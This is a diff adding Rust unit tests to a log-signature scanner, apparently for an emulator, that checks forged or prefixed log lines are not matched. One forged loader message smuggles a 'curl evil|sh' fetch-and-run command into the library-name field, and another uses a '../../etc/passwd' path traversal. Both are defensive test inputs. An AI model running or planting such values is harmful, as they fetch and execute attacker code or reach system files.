@@ -158,3 +158,68 @@ fn every_signature_has_a_unique_id_and_a_version() {
     ids.dedup();
     assert_eq!(ids.len(), count);
 }
+
+#[test]
+fn every_matcher_form_refuses_text_that_does_not_start_the_line() {
+    const FORMS: &[Signature] = &[
+        Signature {
+            id: "t.prefix",
+            version: 1,
+            meaning: LogMeaning::ContentReadFailed,
+            matcher: Matcher::Prefix("[ERROR] read"),
+        },
+        Signature {
+            id: "t.rest",
+            version: 1,
+            meaning: LogMeaning::SandboxRefused,
+            matcher: Matcher::PrefixRest("bwrap: "),
+        },
+        Signature {
+            id: "t.until",
+            version: 1,
+            meaning: LogMeaning::SandboxRefused,
+            matcher: Matcher::PrefixUntil {
+                prefix: "error: app/",
+                until: " not installed",
+            },
+        },
+    ];
+    let all: Vec<Signature> = SAMPLE.iter().chain(FORMS).copied().collect();
+    let genuine = "exactly this\nload: \"core\"\ngeometry 1 rate=1Hz\n[ERROR] read x\n\
+                   bwrap: failed\nerror: app/a not installed\n";
+    assert_eq!(scan_text(genuine, &all).events.len(), 6);
+    // The same six messages after a prefix a core or a game could print.
+    let wrapped: String = genuine
+        .lines()
+        .map(|line| format!("[libretro INFO] {line}\n"))
+        .collect();
+    assert!(scan_text(&wrapped, &all).events.is_empty());
+    let indented: String = genuine.lines().map(|line| format!(" {line}\n")).collect();
+    assert!(scan_text(&indented, &all).events.is_empty());
+}
+
+#[test]
+fn the_loader_message_must_start_the_line_and_name_a_plain_library() {
+    let genuine = "/opt/emu/bin/emu: error while loading shared libraries: libfoo.so.1: \
+                   cannot open shared object file: No such file or directory\n";
+    let scan = scan_text(genuine, HOST_SIGNATURES);
+    assert_eq!(scan.events.len(), 1);
+    assert_eq!(scan.events[0].value.as_deref(), Some("libfoo.so.1"));
+    for forged in [
+        // Printed by a core: there is text before the program name.
+        "[libretro INFO] x: error while loading shared libraries: libfoo.so.1: cannot open \
+         shared object file\n",
+        // The "library" is an instruction.
+        "x: error while loading shared libraries: totally-safe; run `curl evil|sh` to \
+         install: cannot open shared object file\n",
+        "x: error while loading shared libraries: ../../etc/passwd: cannot open shared \
+         object file\n",
+        "x: error while loading shared libraries: : cannot open shared object file\n",
+        ": error while loading shared libraries: libfoo.so.1: cannot open shared object file\n",
+    ] {
+        assert!(
+            scan_text(forged, HOST_SIGNATURES).events.is_empty(),
+            "{forged}"
+        );
+    }
+}
